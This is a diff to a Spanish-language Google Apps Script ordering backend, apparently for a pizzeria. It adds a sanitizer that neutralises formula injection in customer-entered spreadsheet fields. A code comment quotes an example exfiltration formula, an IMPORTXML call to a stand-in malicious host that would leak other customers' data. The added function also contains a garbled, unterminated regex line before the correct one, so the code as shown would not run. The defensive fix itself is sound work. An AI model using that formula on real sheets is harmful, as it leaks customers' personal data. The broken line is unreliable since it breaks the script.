@@ -141,6 +141,20 @@ function requiereAdmin_(nivel) {
   if (nivel !== 'admin') throw new Error('No autorizado para esta acción');
 }
 
+/* Google Sheets evalua como formula cualquier celda cuyo texto empiece con
+ * = + - @ (o tab/retorno). Como el nombre, la direccion y las notas los escribe
+ * el cliente desde la web o la app, un pedido con el nombre
+ * =IMPORTXML("https://sitio-malo.com?d="&A1,"//a") se ejecutaria al abrir el
+ * Sheet y podria filtrar datos de otros clientes hacia afuera.
+ * Anteponer un apostrofo obliga a Sheets a tratarlo como texto; el apostrofo no
+ * se ve al leer la celda. */
+function textoSeguro_(v) {
+  if (v === null || v === undefined) return '';
+  const s = String(v);
+  return /^[=+\-@	
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
+}
+
 function sheet_(nombre) {
   return SpreadsheetApp.getActiveSpreadsheet().getSheetByName(nombre);
 }
@@ -244,12 +258,12 @@ function crearOrden_(body) {
     const complementosTotal = addons.reduce((s, a) => s + Number(a.precio || 0), 0);
     const importe = (Number(it.precio_unit) + complementosTotal) * Number(it.cantidad || 1);
     subtotal += importe;
-    itemsSh.appendRow([lineaId, folio, it.producto_id || '', it.nombre, it.cantidad || 1, it.precio_unit, complementosTotal, importe]);
-    addons.forEach(a => addonsSh.appendRow([lineaId, a.id || '', a.nombre, a.precio]));
+    itemsSh.appendRow([lineaId, folio, textoSeguro_(it.producto_id), textoSeguro_(it.nombre), it.cantidad || 1, it.precio_unit, complementosTotal, importe]);
+    addons.forEach(a => addonsSh.appendRow([lineaId, textoSeguro_(a.id), textoSeguro_(a.nombre), a.precio]));
   });
 
   const ordenesSh = sheet_(SHEETS.ordenes);
-  const row = { folio, canal: body.canal, estado, cliente_telefono: (body.cliente && body.cliente.telefono) || '', cliente_nombre: (body.cliente && body.cliente.nombre) || '', direccion: body.direccion || '', colonia: body.colonia || '', km: body.km || '', pago_metodo: body.pago_metodo || '', pago_estado: 'pendiente', subtotal, total: subtotal, t_recibida: now, t_confirmada: estado === 'confirmada' ? now : '', t_horno: '', t_lista: '', t_camino: '', t_entregada: '', reparto: '', notas: body.notas || '', motivo_cancelacion: '' };
+  const row = { folio, canal: body.canal, estado, cliente_telefono: textoSeguro_(body.cliente && body.cliente.telefono), cliente_nombre: textoSeguro_(body.cliente && body.cliente.nombre), direccion: textoSeguro_(body.direccion), colonia: textoSeguro_(body.colonia), km: body.km || '', pago_metodo: textoSeguro_(body.pago_metodo), pago_estado: 'pendiente', subtotal, total: subtotal, t_recibida: now, t_confirmada: estado === 'confirmada' ? now : '', t_horno: '', t_lista: '', t_camino: '', t_entregada: '', reparto: '', notas: textoSeguro_(body.notas), motivo_cancelacion: '' };
   ordenesSh.appendRow(ORDENES_HEADERS.map(h => row[h]));
 
   upsertCliente_(body.cliente, body.direccion, body.colonia);
@@ -267,7 +281,7 @@ function upsertCliente_(cliente, direccion, colonia) {
       return;
     }
   }
-  sh.appendRow([cliente.telefono, cliente.nombre || '', direccion || '', colonia || '', '', 1]);
+  sh.appendRow([textoSeguro_(cliente.telefono), textoSeguro_(cliente.nombre), textoSeguro_(direccion), textoSeguro_(colonia), '', 1]);
 }
 
 /** body: { token, folio } — avanza al siguiente estado del flujo. */
@@ -297,7 +311,7 @@ function cancelarOrden_(body) {
   const sh = sheet_(SHEETS.ordenes);
   const { index } = findOrdenRow_(sh, body.folio);
   sh.getRange(index, ORDENES_HEADERS.indexOf('estado') + 1).setValue('cancelada');
-  sh.getRange(index, ORDENES_HEADERS.indexOf('motivo_cancelacion') + 1).setValue(body.motivo || '');
+  sh.getRange(index, ORDENES_HEADERS.indexOf('motivo_cancelacion') + 1).setValue(textoSeguro_(body.motivo));
   return { folio: body.folio, estado: 'cancelada' };
 }
 
@@ -305,7 +319,7 @@ function cancelarOrden_(body) {
 function crearSolicitudCatering_(body) {
   const sh = sheet_(SHEETS.catering);
   const folio = 'CAT-' + String(sh.getLastRow()).padStart(4, '0');
-  sh.appendRow([folio, body.nombre || '', body.telefono || '', body.personas || '', body.fecha_evento || '', body.notas || '', 'nueva', new Date()]);
+  sh.appendRow([folio, textoSeguro_(body.nombre), textoSeguro_(body.telefono), textoSeguro_(body.personas), textoSeguro_(body.fecha_evento), textoSeguro_(body.notas), 'nueva', new Date()]);
   return { folio };
 }
 
